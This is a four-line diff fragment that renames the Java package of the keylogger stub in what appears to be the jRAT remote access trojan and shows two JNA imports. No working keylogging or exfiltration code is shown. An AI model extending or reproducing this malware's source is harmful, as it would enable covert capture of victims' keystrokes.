@@ -1,4 +1,4 @@
-package org.jrat.project.stub.keylogger;
+package pro.jrat.stub.keylogger;
 
 import com.sun.jna.Native;
 import com.sun.jna.Pointer;
